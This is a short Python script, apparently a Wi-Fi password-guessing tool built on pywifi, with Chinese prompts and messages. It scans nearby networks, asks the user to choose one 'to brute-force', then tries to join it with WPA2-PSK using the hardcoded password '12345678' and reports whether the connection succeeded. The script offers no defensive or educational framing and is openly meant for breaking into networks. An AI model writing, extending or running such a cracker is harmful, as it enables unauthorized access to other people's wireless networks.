import pywifi,time
class HackWifi:
    def choose(self):
        self.ifaces.scan()
        result=self.ifaces.scan_results()
        time.sleep(1)
        order = 0
        list = []
        for WIFI in result:
            order += 1
            print(order,".",WIFI.ssid.encode('raw_unicode_escape').decode('utf-8'))
            list.append(WIFI.ssid)
        name = int(input("选择你要爆破的WiFi(序号):"))
        return list[name-1]
    def hack(self,ssid,key):
        self.ifaces.disconnect()
        time.sleep(1)
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = key
        self.ifaces.remove_all_network_profiles()
        tep_profile = self.ifaces.add_network_profile(profile)
        self.ifaces.connect(tep_profile)
        time.sleep(3)
        if self.ifaces.status() == pywifi.const.IFACE_CONNECTED:
            print("WiFi连接成功")
        else:
            print("连接失败")
    def __init__(self):
        wifi = pywifi.PyWiFi()
        self.ifaces = wifi.interfaces()[0]
        self.ifaces.disconnect()
        time.sleep(1)
        ssid = self.choose()
        self.hack(ssid,"12345678")


if __name__ == "__main__":
    a = HackWifi()

